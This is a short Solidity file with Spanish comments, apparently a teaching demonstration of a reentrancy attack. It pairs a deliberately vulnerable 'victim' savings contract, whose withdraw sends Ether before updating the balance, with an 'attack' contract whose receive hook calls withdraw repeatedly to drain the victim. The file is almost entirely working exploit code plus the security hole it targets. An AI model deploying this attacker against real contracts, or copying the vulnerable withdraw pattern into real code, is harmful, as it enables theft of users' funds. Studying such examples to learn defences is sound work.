// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

//Victima
//Smart Contract de una cuenta de ahorra
contract victim {
  
  //Balances
  mapping(address => uint) public balances;

  //Agregar Ether a mi cuenta. 
  function donate() public payable {
    balances[msg.sender] += msg.value;
  }

  //Consultar mi balance
  function balanceOf() public view returns (uint balance) {
    return address(this).balance;
  }


    //Retirar Ether de mi cuenta
    function withdraw(uint _amount) public {

    //Si mi balance es  mayor o gual que el valor que va a retirar, prosigue. 
    require(balances[msg.sender] >= _amount, "Fondos insuficientes"); 

      //Envía el valor solicitado 
      (bool result,) = msg.sender.call{value:_amount}("");
      
      if(result) {
        _amount;
      }

      //Actualiza el balance. 
      balances[msg.sender] -= _amount;

  }

}

//Deposita Ether como trigger para el ataque

//Hacker 
contract attack{
    
    //Instanciar el contract victima
    victim public victimContract; 

    //Amount a retirar
    uint256 public amount = 1 wei;

    //Owner del contract atack
    address payable owner;

    //Constructor. Recibe el address del contract victima. 
    constructor(address _contracToAttack){
        victimContract = victim(_contracToAttack);
        owner = payable(msg.sender);
    }

    //Donar al contract victima. 
    function donateToVictim() external payable{
        victimContract.donate{value: msg.value}();
    }
    
    //Receive es una función que se ejecutará cada que se envían Ether al contract 
    //Y no se hayn especificado datos de llamada. 
    receive() external payable{
        //Que ejecute la función siempre y cuando aun haya balance
        if(address(victimContract).balance != 0 wei){
            victimContract.withdraw(amount);
        }
    } 

    //Conocer el balance total de la address del atacante.
    function getTotalBalance() public view returns (uint256){
        return address(this).balance;
    }

}
